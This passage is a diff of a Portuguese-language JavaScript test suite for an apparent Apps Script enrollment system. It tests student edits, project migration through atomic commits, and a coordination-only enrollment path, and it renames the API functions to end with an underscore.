+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, matricula: '   ' });
   igual(r.ok, false);
   verdadeiro(/não pode ficar em branco/.test(r.erro), r.erro);
 });
@@ -2291,7 +2334,7 @@ teste('matrícula fora do formato não chega a custar leitura nenhuma', () => {
   const amb = cenarioMatriculaTrocada();
   amb.zerar();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, matricula: '12' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, matricula: '12' });
   igual(r.ok, false);
   verdadeiro(/Matrícula inválida/.test(r.erro), r.erro);
   // ERA "zero requisições". Desde 19/09 a régua lê `matricula_digitos` da
@@ -2315,22 +2358,22 @@ teste('inscrição SEM matrícula: mudar o NOME também move o documento', () =>
   const velha = inscrever(api, 'p1', 'R+ Cidades', {
     nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
-  api.reconciliar();
+  api.reconciliar_();
 
-  const id = api.chaveAluno_('pes:ana@exemplo.com|' + api.chaveNome('Ana Lima'));
-  verdadeiro(api.ler('alunos', id) !== null, 'o cenário não montou a ficha sem matrícula');
+  const id = api.chaveAluno_('pes:ana@exemplo.com|' + api.chaveNome_('Ana Lima'));
+  verdadeiro(api.ler_('alunos', id) !== null, 'o cenário não montou a ficha sem matrícula');
 
-  const r = chamar(amb, 'editarAluno', { id: id, nome: 'Ana Lima Souza' });
+  const r = chamar(amb, 'editarAluno_', { id: id, nome: 'Ana Lima Souza' });
   igual(r.ok, true, r.erro);
-  igual(api.ler('inscricoes', velha.id), null, 'a inscrição ficou no endereço da chave velha');
-  igual(api.contar('inscricoes'), 1);
+  igual(api.ler_('inscricoes', velha.id), null, 'a inscrição ficou no endereço da chave velha');
+  igual(api.contar_('inscricoes'), 1);
   igual(r.reconciliou, true, 'a chave da pessoa mudou: a ficha precisa mudar de endereço também');
 });
 
 teste('aluno que veio só da lista oficial não tem matrícula editável — e a recusa diz por quê', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, matricula: '7777777' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, matricula: '7777777' });
   igual(r.ok, false);
   verdadeiro(/não tem inscrição/.test(r.erro), r.erro);
 });
@@ -2342,16 +2385,16 @@ grupo('editarAluno — nome e turma vão para a fonte, e sobrevivem à rodada se
 teste('a turma é gravada na lista oficial, e a reconciliação a mantém', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, turma: 'ADM62' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, turma: 'ADM62' });
   igual(r.ok, true, r.erro);
   igual(r.reconciliou, false, 'mudar turma não precisa de cruzamento');
 
-  igual(amb.api.ler('matriculados', '9110700').turma, 'ADM62', 'a turma não foi para a fonte');
-  igual(amb.api.ler('alunos', amb.idDoBruno).turma, 'ADM62', 'a tela mostraria a turma velha');
+  igual(amb.api.ler_('matriculados', '9110700').turma, 'ADM62', 'a turma não foi para a fonte');
+  igual(amb.api.ler_('alunos', amb.idDoBruno).turma, 'ADM62', 'a tela mostraria a turma velha');
 
   // A prova de que a correção DURA: a rodada seguinte recalcula a ficha do zero.
-  amb.api.reconciliar();
-  igual(amb.api.ler('alunos', amb.idDoBruno).turma, 'ADM62',
+  amb.api.reconciliar_();
+  igual(amb.api.ler_('alunos', amb.idDoBruno).turma, 'ADM62',
     'a correção sumiu no cruzamento — foi gravada no lugar errado');
 });
 
@@ -2361,12 +2404,12 @@ teste('a turma de quem não está na lista oficial é recusada, em vez de aceita
   inscrever(amb.api, 'p1', 'R+ Cidades', {
     matricula: '5550001', nome: 'Carla Dias', email: 'carla@exemplo.com', curso_fase: 'ADS - ADS11'
   });
-  amb.api.reconciliar();
+  amb.api.reconciliar_();
 
   const id = amb.api.chaveAluno_('mat:5550001');
-  igual(amb.api.ler('alunos', id).status, 'SO_INSCRITO');
+  igual(amb.api.ler_('alunos', id).status, 'SO_INSCRITO');
 
-  const r = chamar(amb, 'editarAluno', { id: id, turma: 'ADS11' });
+  const r = chamar(amb, 'editarAluno_', { id: id, turma: 'ADS11' });
   igual(r.ok, false);
   verdadeiro(/vem da lista oficial/.test(r.erro), r.erro);
 });
@@ -2374,27 +2417,27 @@ teste('a turma de quem não está na lista oficial é recusada, em vez de aceita
 teste('corrigir o nome DIGITADO não muda a linha do cadastro de quem casou com a secretaria', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, nome: 'ana lima de souza' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, nome: 'ana lima de souza' });
   igual(r.ok, true, r.erro);
 
-  igual(amb.api.ler('inscricoes', amb.inscricao.id).nome, 'Ana Lima de Souza',
+  igual(amb.api.ler_('inscricoes', amb.inscricao.id).nome, 'Ana Lima de Souza',
     'o nome digitado é gravado na inscrição, com a mesma formatação do formulário');
 
   // `montarAluno_` faz `mat.nome || insc.nome`: a lista oficial manda. Gravar o
   // nome digitado na ficha aqui seria escrever algo que a rodada das 5h desfaria.
-  igual(amb.api.ler('alunos', amb.idDoBruno).nome, 'Bruno Costa');
+  igual(amb.api.ler_('alunos', amb.idDoBruno).nome, 'Bruno Costa');
 
-  amb.api.reconciliar();
-  igual(amb.api.ler('alunos', amb.idDoBruno).nome, 'Bruno Costa', 'a projeção e a rodada discordaram');
+  amb.api.reconciliar_();
+  igual(amb.api.ler_('alunos', amb.idDoBruno).nome, 'Bruno Costa', 'a projeção e a rodada discordaram');
 });
 
 teste('corrigir o nome OFICIAL muda a linha do cadastro, porque é ele que manda', () => {
   const amb = cenarioMatriculaTrocada();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDoBruno, nome_oficial: 'Bruno Costa Filho' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDoBruno, nome_oficial: 'Bruno Costa Filho' });
   igual(r.ok, true, r.erro);
-  igual(amb.api.ler('matriculados', '9110700').nome, 'Bruno Costa Filho');
-  igual(amb.api.ler('alunos', amb.idDoBruno).nome, 'Bruno Costa Filho');
+  igual(amb.api.ler_('matriculados', '9110700').nome, 'Bruno Costa Filho');
+  igual(amb.api.ler_('alunos', amb.idDoBruno).nome, 'Bruno Costa Filho');
 
   verdadeiro(r.avisos.join(' ').indexOf('importação') !== -1,
     'quem corrige a lista da secretaria precisa saber que a próxima importação sobrescreve');
@@ -2402,11 +2445,11 @@ teste('corrigir o nome OFICIAL muda a linha do cadastro, porque é ele que manda
 
 teste('a projeção usa a MESMA precedência de montarAluno_ — campo a campo', () => {
   const amb = cenarioMatriculaTrocada();
-  chamar(amb, 'editarAluno', { id: amb.idDoBruno, nome_oficial: 'Bruno Costa Filho', turma: 'ADM62' });
+  chamar(amb, 'editarAluno_', { id: amb.idDoBruno, nome_oficial: 'Bruno Costa Filho', turma: 'ADM62' });
 
-  const projetado = amb.api.ler('alunos', amb.idDoBruno);
-  const inscricao = amb.api.ler('inscricoes', amb.inscricao.id);
-  const matriculado = amb.api.ler('matriculados', '9110700');
+  const projetado = amb.api.ler_('alunos', amb.idDoBruno);
+  const inscricao = amb.api.ler_('inscricoes', amb.inscricao.id);
+  const matriculado = amb.api.ler_('matriculados', '9110700');
 
   // O que a reconciliação produziria com os MESMOS documentos. Se as duas
   // divergirem, a tela mostra um valor agora e outro depois da madrugada.
@@ -2420,7 +2463,7 @@ teste('salvar sem mudar nada não escreve nada', () => {
   const amb = cenarioMatriculaTrocada();
   amb.zerar();
 
-  const r = chamar(amb, 'editarAluno', {
+  const r = chamar(amb, 'editarAluno_', {
     id: amb.idDoBruno, matricula: '9110700', nome: 'Ana Lima',
     nome_oficial: 'Bruno Costa', turma: 'ADM61', projeto_id: 'p1'
   });
@@ -2447,16 +2490,16 @@ function cenarioMigracao() {
     matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
 
-  api.reconciliar();
+  api.reconciliar_();
   amb.idDaAna = api.chaveAluno_('mat:9110701');
   return amb;
 }
 
 teste('o projeto de destino já estava esgotado — e a migração passa mesmo assim', () => {
   const amb = cenarioMigracao();
-  igual(amb.api.listarProjetos(false).filter((p) => p.id === 'p2')[0].situacao, 'ESGOTADO');
+  igual(amb.api.listarProjetos_(false).filter((p) => p.id === 'p2')[0].situacao, 'ESGOTADO');
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
   igual(r.ok, true, r.erro);
   verdadeiro(/3 de 2 vagas/.test(r.mensagem), 'a frase precisa dizer o número verdadeiro: ' + r.mensagem);
 });
@@ -2466,7 +2509,7 @@ teste('a vaga conta de verdade: a agregação do destino sobe, sem contador grav
   igual(amb.api.contarInscritos_('p2'), 2);
   igual(amb.api.contarInscritos_('p1'), 1);
 
-  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
 
   igual(amb.api.contarInscritos_('p2'), 3, 'a inscrição não mudou de projeto de verdade');
   igual(amb.api.contarInscritos_('p1'), 0, 'a inscrição ficou nos dois projetos ao mesmo tempo');
@@ -2474,9 +2517,9 @@ teste('a vaga conta de verdade: a agregação do destino sobe, sem contador grav
 
 teste('o contador mostra 3 de 2, e não 2 de 2', () => {
   const amb = cenarioMigracao();
-  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
 
-  const p2 = chamar(amb, 'painelProjetos').itens.filter((p) => p.id === 'p2')[0];
+  const p2 = chamar(amb, 'painelProjetos_').itens.filter((p) => p.id === 'p2')[0];
   igual(p2.inscritos, 3, 'o painel arredondou a ocupação para o teto');
   igual(p2.vagas, 2);
   igual(p2.restantes, 0, '"faltam -1 vagas" não é frase — o que não pode é o inscritos mentir');
@@ -2485,13 +2528,13 @@ teste('o contador mostra 3 de 2, e não 2 de 2', () => {
 
 teste('o formulário do aluno continua barrando: a exceção é da coordenação, não do público', () => {
   const amb = cenarioMigracao();
-  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
 
   // O caminho público passa pelo lock (09_Projetos.gs), e o sandbox de apoio.js
   // não tem LockService — é o mesmo mínimo que testes/api.js injeta.
   amb.api.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
 
-  const r = amb.api.submeterInscricao({
+  const r = amb.api.submeterInscricao_({
     projeto_id: 'p2', matricula: '9110003', nome: 'Tres Aluno', email: 'tres@exemplo.com',
     curso_fase: 'ADS - ADS11', declara_ciencia: true, consentimento_lgpd: 'SIM', origem: 'SITE'
   });
@@ -2502,9 +2545,9 @@ teste('o formulário do aluno continua barrando: a exceção é da coordenação
 
 teste('a migração vai para o histórico com de onde saiu, para onde foi e quanto ficou', () => {
   const amb = cenarioMigracao();
-  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
 
-  const linha = chamar(amb, 'listarLog').itens.filter((l) => l.acao === 'ALUNO_MIGRADO')[0];
+  const linha = chamar(amb, 'listarLog_').itens.filter((l) => l.acao === 'ALUNO_MIGRADO')[0];
   verdadeiro(linha, 'a migração não deixou trilha');
   igual(linha.usuario, 'coordenacao@exemplo.com');
   verdadeiro(linha.detalhe.indexOf('R+ Cidades') !== -1, linha.detalhe);
@@ -2516,7 +2559,7 @@ teste('a migração vai para o histórico com de onde saiu, para onde foi e quan
 teste('a resposta do banco perdida DEPOIS do commit: a migração não diz "não mudei nada" com tudo mudado', () => {
   // O `:commit` do Editar é criar-no-novo + apagar-no-velho. Se o 503 chegar na
   // RESPOSTA dele, a retentativa leva ALREADY_EXISTS (o documento novo é da
-  // tentativa anterior) e `escreverAtomico` devolve `jaExistia`. Responder "não
+  // tentativa anterior) e `escreverAtomico_` devolve `jaExistia`. Responder "não
   // mudei nada" ali pararia `aplicarEdicao_` antes dos passos 2 e 3: a inscrição
   // teria mudado de lugar, a ficha continuaria apontando para o documento
   // APAGADO e mostrando o projeto de onde o aluno saiu, e não haveria linha no
@@ -2526,19 +2569,19 @@ teste('a resposta do banco perdida DEPOIS do commit: a migração não diz "não
   // Mutação que derruba: devolver a recusa sem conferir se o documento VELHO
   // ainda existe (a leitura só deste ramo, em `gravarInscricaoEditada_`).
   const amb = cenarioMigracao();
-  const velha = amb.api.ler('alunos', amb.idDaAna).inscricao_id;
+  const velha = amb.api.ler_('alunos', amb.idDaAna).inscricao_id;
   amb.falso.derrubarDepoisDeAplicar(':commit', 503, 'UNAVAILABLE');
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
 
   igual(r.ok, true, 'erro foi: ' + r.erro);
-  igual(amb.api.ler('inscricoes', velha), null, 'a migração entrou: o endereço velho está vazio');
+  igual(amb.api.ler_('inscricoes', velha), null, 'a migração entrou: o endereço velho está vazio');
 
-  const ficha = amb.api.ler('alunos', amb.idDaAna);
+  const ficha = amb.api.ler_('alunos', amb.idDaAna);
   igual(ficha.inscricao_id, amb.api.chaveDedup_({ projeto_id: 'p2', matricula: '9110701' }),
     'a ficha ficou apontando para um documento apagado');
   igual(ficha.projeto, 'Robótica', 'a ficha continuou mostrando o projeto de onde ele saiu');
-  verdadeiro(amb.api.ler('inscricoes', ficha.inscricao_id) !== null, 'o ponteiro da ficha não existe no banco');
+  verdadeiro(amb.api.ler_('inscricoes', ficha.inscricao_id) !== null, 'o ponteiro da ficha não existe no banco');
   igual(linhasDoLog(amb, 'ALUNO_MIGRADO').length, 1, 'a migração aconteceu e não deixou trilha');
 });
 
@@ -2550,17 +2593,17 @@ teste('endereço novo ocupado DE VERDADE: a recusa continua, e a inscrição vel
   // inscrição de outro cadastro, e o aluno sumiria do projeto de origem sem ter
   // saído dele).
   const amb = cenarioMigracao();
-  const velha = amb.api.ler('alunos', amb.idDaAna).inscricao_id;
+  const velha = amb.api.ler_('alunos', amb.idDaAna).inscricao_id;
   // A mesma pessoa já está no destino: é o 409 legítimo.
   inscrever(amb.api, 'p2', 'Robótica', {
     matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
 
   igual(r.ok, false);
   verdadeiro(r.erro.indexOf('Não mudei nada') !== -1, 'a mensagem foi: ' + r.erro);
-  verdadeiro(amb.api.ler('inscricoes', velha) !== null, 'a inscrição velha foi apagada numa recusa');
+  verdadeiro(amb.api.ler_('inscricoes', velha) !== null, 'a inscrição velha foi apagada numa recusa');
   igual(linhasDoLog(amb, 'ALUNO_MIGRADO').length, 0);
 });
 
@@ -2568,12 +2611,12 @@ teste('migrar não dispara o cruzamento — a chave da pessoa não mudou', () =>
   const amb = cenarioMigracao();
   amb.zerar();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
   igual(r.reconciliou, false);
   verdadeiro(amb.falso.requisicoes.length < 15,
     'uma migração custou ' + amb.falso.requisicoes.length + ' requisições — o cruzamento entrou junto?');
 
-  const ficha = amb.api.ler('alunos', amb.idDaAna);
+  const ficha = amb.api.ler_('alunos', amb.idDaAna);
   igual(ficha.projeto, 'Robótica', 'a ficha continuaria mostrando o projeto de onde ele saiu');
   igual(ficha.inscricao_id, amb.api.chaveDedup_({ projeto_id: 'p2', matricula: '9110701' }),
     'a ficha aponta para uma inscrição que mudou de endereço — o detalhe abriria vazio');
@@ -2587,15 +2630,15 @@ teste('quem está em dois projetos migra um e mantém o outro', () => {
     matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
   semearProjeto(api, 'p3', 'Horta', 30);
-  api.reconciliar();
+  api.reconciliar_();
 
-  const antes = api.ler('alunos', amb.idDaAna).projeto.split(' | ');
+  const antes = api.ler_('alunos', amb.idDaAna).projeto.split(' | ');
   igual(antes.length, 2, 'o cenário não montou o aluno em dois projetos');
 
-  const saiuDe = api.ler('inscricoes', api.ler('alunos', amb.idDaAna).inscricao_id).projeto_nome;
-  chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p3' });
+  const saiuDe = api.ler_('inscricoes', api.ler_('alunos', amb.idDaAna).inscricao_id).projeto_nome;
+  chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p3' });
 
-  const depois = api.ler('alunos', amb.idDaAna).projeto.split(' | ');
+  const depois = api.ler_('alunos', amb.idDaAna).projeto.split(' | ');
   igual(depois.length, 2);
   verdadeiro(depois.indexOf('Horta') !== -1, 'o projeto novo não entrou: ' + depois.join(' | '));
   igual(depois.indexOf(saiuDe), -1, 'o projeto de onde ele saiu continuou na ficha: ' + depois.join(' | '));
@@ -2603,7 +2646,7 @@ teste('quem está em dois projetos migra um e mantém o outro', () => {
 
 teste('migrar para projeto inexistente é recusado', () => {
   const amb = cenarioMigracao();
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'nao-existe' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'nao-existe' });
   igual(r.ok, false);
   verdadeiro(/Projeto de destino não encontrado/.test(r.erro), r.erro);
 });
@@ -2615,36 +2658,36 @@ teste('migrar a mesma pessoa para onde ela já está é recusado pelo banco', ()
   inscrever(api, 'p2', 'Robótica', {
     matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
-  api.reconciliar();
+  api.reconciliar_();
 
   // Qual das duas inscrições a ficha aponta é decidido por `porChegada_`, e as
   // duas nasceram no mesmo segundo — o desempate é pelo id, que é um hash. Então
   // o destino da migração é lido do dado, e não escrito à mão: fixar 'p2' aqui
   // faria o teste passar ou falhar por sorteio.
-  const atual = api.ler('inscricoes', api.ler('alunos', amb.idDaAna).inscricao_id).projeto_id;
+  const atual = api.ler_('inscricoes', api.ler_('alunos', amb.idDaAna).inscricao_id).projeto_id;
   const destino = atual === 'p1' ? 'p2' : 'p1';
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: destino });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: destino });
   igual(r.ok, false);
   verdadeiro(/já está em "/.test(r.erro), r.erro);
-  igual(api.contar('inscricoes'), 4, 'a recusa apagou ou duplicou alguma inscrição');
+  igual(api.contar_('inscricoes'), 4, 'a recusa apagou ou duplicou alguma inscrição');
 });
 
 teste('a migração é UM `:commit`: cria no endereço novo e apaga o velho, tudo ou nada', () => {
   // A inscrição não se "atualiza" de projeto: o id do documento É a chave de
   // dedup, e mudar o projeto muda o ENDEREÇO. Eram duas escritas soltas —
-  // `inserir` e `excluir` —, e a execução que morresse entre elas deixava a
+  // `inserir_` e `excluir_` —, e a execução que morresse entre elas deixava a
   // mesma pessoa em dois projetos, com o teto do destino contando um a mais. O
-  // defeito estava escrito no cabeçalho de `editarAluno` desde o primeiro dia,
+  // defeito estava escrito no cabeçalho de `editarAluno_` desde o primeiro dia,
   // e a primitiva que faltava nasceu com a troca de projeto do aluno.
   //
-  // Mutação que derruba: voltar a `inserir` + `excluir` — duas requisições, e o
+  // Mutação que derruba: voltar a `inserir_` + `excluir_` — duas requisições, e o
   // DELETE solto reaparece na contagem.
   const amb = cenarioMigracao();
-  const velho = amb.api.ler('alunos', amb.idDaAna).inscricao_id;
+  const velho = amb.api.ler_('alunos', amb.idDaAna).inscricao_id;
   amb.zerar();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
   igual(r.ok, true, r.erro);
 
   const commits = amb.falso.requisicoes.filter((q) => q.url.indexOf(':commit') !== -1);
@@ -2662,8 +2705,8 @@ teste('a migração é UM `:commit`: cria no endereço novo e apaga o velho, tud
   igual(writes[1].currentDocument, undefined,
     'o delete versionado derrubaria o commit inteiro se a coordenação anulasse a inscrição no meio');
 
-  igual(amb.api.ler('inscricoes', velho), null, 'a inscrição ficou nos dois endereços');
-  igual(amb.api.ler('inscricoes', novoEndereco).projeto_id, 'p2');
+  igual(amb.api.ler_('inscricoes', velho), null, 'a inscrição ficou nos dois endereços');
+  igual(amb.api.ler_('inscricoes', novoEndereco).projeto_id, 'p2');
 });
 
 teste('endereço novo ocupado: o commit inteiro é recusado e a inscrição VELHA continua viva', () => {
@@ -2671,19 +2714,19 @@ teste('endereço novo ocupado: o commit inteiro é recusado e a inscrição VELH
   // (a pessoa ficaria sem inscrição nenhuma), ou tratar o 409 como sucesso.
   const amb = cenarioMigracao();
   const api = amb.api;
-  const velho = api.ler('alunos', amb.idDaAna).inscricao_id;
+  const velho = api.ler_('alunos', amb.idDaAna).inscricao_id;
   const ocupado = api.chaveDedup_({ projeto_id: 'p2', matricula: '9110701' });
   inscrever(api, 'p2', 'Robótica', {
     matricula: '9110701', nome: 'Ana Lima', email: 'ana@exemplo.com', curso_fase: 'ADS - ADS21'
   });
-  igual(api.ler('inscricoes', ocupado).projeto_id, 'p2', 'o cenário devia ter ocupado o endereço de destino');
+  igual(api.ler_('inscricoes', ocupado).projeto_id, 'p2', 'o cenário devia ter ocupado o endereço de destino');
   amb.zerar();
 
-  const r = chamar(amb, 'editarAluno', { id: amb.idDaAna, projeto_id: 'p2' });
+  const r = chamar(amb, 'editarAluno_', { id: amb.idDaAna, projeto_id: 'p2' });
   igual(r.ok, false);
   verdadeiro(/já está em "/.test(r.erro), r.erro);
-  verdadeiro(api.ler('inscricoes', velho) !== null, 'a recusa apagou a inscrição que ficava');
-  igual(api.ler('inscricoes', velho).projeto_id, 'p1');
+  verdadeiro(api.ler_('inscricoes', velho) !== null, 'a recusa apagou a inscrição que ficava');
+  igual(api.ler_('inscricoes', velho).projeto_id, 'p1');
   igual(api.contarInscritos_('p1'), 1);
   igual(api.contarInscritos_('p2'), 3, 'o destino ganhou uma inscrição que o banco recusou');
 });
@@ -2694,7 +2737,7 @@ teste('endereço novo ocupado: o commit inteiro é recusado e a inscrição VELH
 //
 // O coordenador precisava incluir um aluno num projeto com a janela de inscrição
 // FECHADA, e não tinha por onde: a única gravação de inscrição era o formulário
-// público, com todas as travas dele. `incluirInscricao` é a porta da coordenação
+// público, com todas as travas dele. `incluirInscricao_` é a porta da coordenação
 // — passa por fora da janela, do interruptor, do anti-abuso e do teto (com
 // confirmação), e NÃO passa por fora da régua da matrícula, da dedup do banco
 // nem da conferência contra a lista oficial. Cada teste diz qual mutação o
@@ -2706,8 +2749,8 @@ grupo('incluirInscricao — a porta da coordenação, por fora da janela e do te
  * Um projeto de 60 vagas, uma matrícula na lista oficial, ninguém inscrito.
  *
  * `usuario: ''` é a REALIDADE do painel publicado: no GitHub Pages
- * `Session.getActiveUser()` volta vazio e `usuarioAtual()` responde 'anonimo'
- * (04_Log.gs). A sessão, essa sim, sabe quem é — e é dela que `incluirInscricao`
+ * `Session.getActiveUser()` volta vazio e `usuarioAtual_()` responde 'anonimo'
+ * (04_Log.gs). A sessão, essa sim, sabe quem é — e é dela que `incluirInscricao_`
  * tem de tirar o operador. Com o `usuario` do ambiente igual ao da sessão, a
  * mutação `var quem = usuarioAtual()` passava em toda a suíte e gravaria
  * `incluido_por: 'anonimo'` em produção sem nenhum teste vermelho.
@@ -2729,7 +2772,7 @@ function pedidoDeInclusao(extra) {
 }
 
 function inscricoesGravadas(amb) {
-  return amb.api.listar('inscricoes', {}).itens;
+  return amb.api.listar_('inscricoes', {}).itens;
 }
 
 /**
@@ -2745,7 +2788,7 @@ function gravacoes(falso) {
 /**
  * As requisições que NÃO são a leitura da configuração. A régua da matrícula lê
  * `matricula_digitos` (uma leitura, que o cache da execução reaproveita) — é a
- * mesma ressalva do teste de formato de `editarAluno`. O que continua proibido é
+ * mesma ressalva do teste de formato de `editarAluno_`. O que continua proibido é
  * tocar em projeto, inscrição ou lista oficial por um pedido malformado.
  */
 function foraDaConfig(falso) {
@@ -2757,19 +2800,19 @@ function leiturasForaDaConfig(falso) {
 }
 
 function linhasDoLog(amb, acao) {
-  return chamar(amb, 'listarLog').itens.filter((l) => l.acao === acao);
+  return chamar(amb, 'listarLog_').itens.filter((l) => l.acao === acao);
 }
 
 teste('o caminho feliz grava UMA inscrição com origem COORDENACAO e quem incluiu', () => {
-  // Mutação que derruba: `gravarInscricao` deixar de copiar
+  // Mutação que derruba: `gravarInscricao_` deixar de copiar
   // `pelaCoordenacao.incluido_por` (o documento sairia sem quem incluiu),
-  // `incluirInscricao` mandar `origem: 'SITE'` (a inscrição da coordenação
+  // `incluirInscricao_` mandar `origem: 'SITE'` (a inscrição da coordenação
   // ficaria indistinguível da do aluno no CSV e na trilha), ou tirar o operador
-  // de `usuarioAtual()` em vez da sessão — aqui ele é 'anonimo', como no GitHub
+  // de `usuarioAtual_()` em vez da sessão — aqui ele é 'anonimo', como no GitHub
   // Pages — ou do payload, que é o que o `incluido_por` intruso abaixo tenta.
   const amb = cenarioInclusao();
-  igual(amb.api.usuarioAtual(), 'anonimo', 'o cenário devia ser o do GitHub Pages');
-  const r = chamar(amb, 'incluirInscricao', pedidoDeInclusao({ incluido_por: 'intruso@exemplo.com' }));
+  igual(amb.api.usuarioAtual_(), 'anonimo', 'o cenário devia ser o do GitHub Pages');
+  const r = chamar(amb, 'incluirInscricao_', pedidoDeInclusao({ incluido_por: 'intruso@exemplo.com' }));
   igual(r.ok, true, r.erro);
 
   const gravadas = inscricoesGravadas(amb);
@@ -2809,11 +2852,11 @@ teste('o caminho feliz grava UMA inscrição com origem COORDENACAO e quem inclu
 });
 
 teste('a coordenação NÃO consente pelo aluno: os três campos de aceite vão VAZIOS', () => {
-  // Mutação que derruba: `gravarInscricao` deixar de zerar os aceites quando
+  // Mutação que derruba: `gravarInscricao_` deixar de zerar os aceites quando
   // `pelaCoordenacao` vem — o documento afirmaria que o aluno RECUSOU a ciência
   // e a imagem, sobre uma pergunta que ninguém lhe fez.
   const amb = cenarioInclusao();
-  chamar(amb, 'incluirInscricao', pedidoDeInclusao());
+  chamar(amb, 'incluirInscricao_', pedidoDeInclusao());
 
   const doc = inscricoesGravadas(amb)[0];
   igual(doc.declara_ciencia, '', 'não perguntado não é NAO');
@@ -2822,13 +2865,13 @@ teste('a coordenação NÃO consente pelo aluno: os três campos de aceite vão 
 });
 
 teste('e o caminho público continua gravando o documento de sempre — sem incluido_por, com SIM/NAO', () => {
-  // Mutação que derruba: `gravarInscricao` gravar `incluido_por: ''` em todo
+  // Mutação que derruba: `gravarInscricao_` gravar `incluido_por: ''` em todo
   // mundo, ou zerar os aceites sem olhar `pelaCoordenacao`. Os dois mudariam o
   // documento que 300 alunos já têm no banco.
   const amb = cenarioInclusao();
   amb.api.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
 
-  const r = amb.api.submeterInscricao({
+  const r = amb.api.submeterInscricao_({
     projeto_id: 'p1', matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com',
     curso_fase: 'ADS - ADS11', declara_ciencia: true, autoriza_imagem: false,
     consentimento_lgpd: true, origem: 'SITE'
@@ -2844,20 +2887,20 @@ teste('e o caminho público continua gravando o documento de sempre — sem incl
 });
 
 teste('o envelope público NÃO tem como pedir o que só a coordenação grava: "" vira NAO e incluido_por é ignorado', () => {
-  // Mutação que derruba: a primeira versão desta entrega — `gravarInscricao`
+  // Mutação que derruba: a primeira versão desta entrega — `gravarInscricao_`
   // reinterpretando a string vazia como "não perguntado" para TODO chamador, ou
   // copiando `dados.incluido_por` quando vem. O site manda booleano, mas `doPost`
   // atende qualquer cliente: um POST à mão com `autoriza_imagem: ''` deixava de
   // gravar 'NAO', e a ficha mostrava "não perguntado" onde o aluno RECUSOU. O
-  // sinal da coordenação vive no segundo argumento de `gravarInscricao`, fora do
+  // sinal da coordenação vive no segundo argumento de `gravarInscricao_`, fora do
   // payload — e é isso que este teste mede pelo caminho que o `doPost` percorre
   // (`SITE_EXTERNO` + `tempoPreenchimento`, o que a guarda anti-abuso exige).
   const amb = cenarioInclusao();
   amb.api.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
-  amb.api.atualizar('projetos', 'p1', { validar_matricula: 'NAO' });
+  amb.api.atualizar_('projetos', 'p1', { validar_matricula: 'NAO' });
 
   // Com projeto: `declara_ciencia` é exigido, então só `autoriza_imagem` cabe vazio.
-  const comProjeto = amb.api.submeterInscricao({
+  const comProjeto = amb.api.submeterInscricao_({
     origem: 'SITE_EXTERNO', tempoPreenchimento: 9000,
     projeto_id: 'p1', matricula: '9110001', nome: 'Aluna Exemplo', email: 'aluna@exemplo.com',
     curso_fase: 'ADS - ADS11', declara_ciencia: true, autoriza_imagem: '', consentimento_lgpd: true,
@@ -2865,10 +2908,10 @@ teste('o envelope público NÃO tem como pedir o que só a coordenação grava: 
   });
   igual(comProjeto.ok, true, comProjeto.erro);
 
-  // Sem projeto (o formulário interno): `validarInscricao` não exige a ciência,
